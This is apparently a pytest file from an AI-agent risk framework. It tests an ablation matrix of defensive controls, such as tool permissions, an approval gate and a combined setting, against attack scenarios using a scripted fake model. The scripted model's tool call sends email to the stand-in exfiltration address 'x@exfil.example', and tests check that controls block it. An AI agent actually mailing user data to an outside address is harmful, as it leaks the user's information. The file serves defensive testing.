"""The Phase 4 matrix driver and its report, offline with a scripted model."""

from __future__ import annotations

from pathlib import Path

import anyio
import pytest

from agent_risk_framework.agent.model import FakeToolModel
from agent_risk_framework.attacks.ablation import ARMS, run_matrix, select_arms
from agent_risk_framework.attacks.scenarios import load_catalog
from agent_risk_framework.benign import load_benign_tasks
from agent_risk_framework.enums import Control
from agent_risk_framework.runlog import RunLog

REPO_ROOT = Path(__file__).resolve().parent.parent
SANDBOX = REPO_ROOT / "data" / "agent_sandbox"
DOC_INDEX = REPO_ROOT / "data" / "doc_index.json"


class Scripted(FakeToolModel):
    """Sends one email to an outside address, then answers; same script every run."""

    def __init__(self) -> None:
        super().__init__(
            [[("send_email", {"to": "x@exfil.example", "subject": "s", "body": "b"})], "done"]
        )

    def generate(self, messages, tools, params=None):  # type: ignore[no-untyped-def]
        self._i = sum(m["role"] == "assistant" for m in messages)  # restart for every run
        return super().generate(messages, tools, params)


def test_arms_are_baseline_each_control_alone_and_combined() -> None:
    assert [a.name for a in ARMS] == ["baseline", *(c.value for c in Control), "combined"]
    assert [len(a.guardrails.controls) for a in ARMS] == [0, 1, 1, 1, 1, 1, 1, 6]
    assert select_arms(["combined"])[0].experiment_id == "phase4-combined"
    with pytest.raises(ValueError, match="unknown arm"):
        select_arms(["firewall"])


def _matrix(log: RunLog, arms, scenarios, tasks):  # type: ignore[no-untyped-def]
    return anyio.run(
        lambda: run_matrix(
            model=Scripted(),
            run_log=log,
            scenarios=scenarios,
            tasks=tasks,
            arms=arms,
            runs=2,
            base_sandbox=SANDBOX,
            doc_index=DOC_INDEX,
        )
    )


def test_matrix_runs_each_arm_once_and_resumes(tmp_path) -> None:
    scenarios = [
        s
        for s in load_catalog(REPO_ROOT / "data" / "attack_scenarios.json").scenarios
        if s.scenario_id == "AC01"
    ]
    tasks = load_benign_tasks(REPO_ROOT / "data" / "benign_tasks.json")[:1]
    arms = select_arms(["baseline", "tool_permissions", "combined"])
    with RunLog(tmp_path / "m.db") as log:
        assert _matrix(log, arms, scenarios, tasks) == ["baseline", "tool_permissions", "combined"]
        assert _matrix(log, arms, scenarios, tasks) == []  # complete arms are skipped
        labels = {r.experiment_id: str(r.config) for r in log.runs()}
        assert labels == {
            "phase4-baseline": "baseline",
            "phase4-tool_permissions": "single-control",
            "phase4-combined": "combined",
        }
        for r in log.runs("phase4-tool_permissions"):
            assert log.controls(r.run_id) == {Control.TOOL_PERMISSIONS}
            assert log.attribution(r.run_id) is not None
        assert {log.attribution(r.run_id).bucket for r in log.runs("phase4-baseline")} >= {
            "succeeded"
        }


def test_matrix_refuses_to_mix_a_partial_arm(tmp_path) -> None:
    scenarios = load_catalog(REPO_ROOT / "data" / "attack_scenarios.json").scenarios[:1]
    tasks = load_benign_tasks(REPO_ROOT / "data" / "benign_tasks.json")[:1]
    with RunLog(tmp_path / "m.db") as log:
        _matrix(log, select_arms(["baseline"]), scenarios, [])  # 2 of the 4 runs
        with pytest.raises(ValueError, match="partial arm"):
            _matrix(log, select_arms(["baseline"]), scenarios, tasks)


def test_report_is_computed_from_the_log(tmp_path) -> None:
    from agent_risk_framework.attacks.ablation_report import (
        END,
        START,
        render_chart,
        render_tables,
        splice,
        summarize,
    )

    scenarios = [
        s
        for s in load_catalog(REPO_ROOT / "data" / "attack_scenarios.json").scenarios
        if s.scenario_id in ("AC01", "AC03")
    ]
    tasks = load_benign_tasks(REPO_ROOT / "data" / "benign_tasks.json")[:2]
    arms = select_arms(["baseline", "tool_permissions", "approval_gate", "combined"])
    with RunLog(tmp_path / "m.db") as log:
        _matrix(log, arms, scenarios, tasks)
        stats = summarize(log)
    by = {s.arm.name: s for s in stats}
    assert [s.arm.name for s in stats] == [
        "baseline",
        "tool_permissions",
        "approval_gate",
        "combined",
    ]
    # The script mails an outside address every run: AC01 succeeds at baseline only.
    assert by["baseline"].per_case["AC01"].k == 2 and by["baseline"].detection.n == 0
    assert by["tool_permissions"].per_case["AC01"].k == 0
    assert by["tool_permissions"].credits[("tool_permissions", "call_blocked")] == 2
    # Allowlist and gate both refuse the same send under combined: entangled, both credited.
    assert by["combined"].shared[("approval_gate", "tool_permissions")] == 2
    # The benign tasks also get the outside send: every arm with a control intervenes.
    assert by["tool_permissions"].fpr.k == by["tool_permissions"].fpr.n == 4
    assert by["baseline"].fpr.k == 0
    tables = render_tables(stats)
    assert "| `combined` |" in tables and "2/4 (50%)" in tables
    doc = f"# Title\n\nintro\n\n{START}\nold\n{END}\n\nfindings\n"
    spliced = splice(doc, tables)
    assert spliced.startswith("# Title") and spliced.endswith("findings\n") and "old" not in spliced
    svg = render_chart(stats)
    assert svg.startswith("<svg") and svg.count("<title>") >= 12
    with pytest.raises(ValueError, match="markers"):
        splice("no markers", tables)


def test_phase4_doc_has_one_generated_block() -> None:
    from agent_risk_framework.attacks.ablation_report import END, START

    doc = (REPO_ROOT / "docs" / "phase4_ablation.md").read_text(encoding="utf-8")
    assert doc.count(START) == doc.count(END) == 1 and doc.index(START) < doc.index(END)
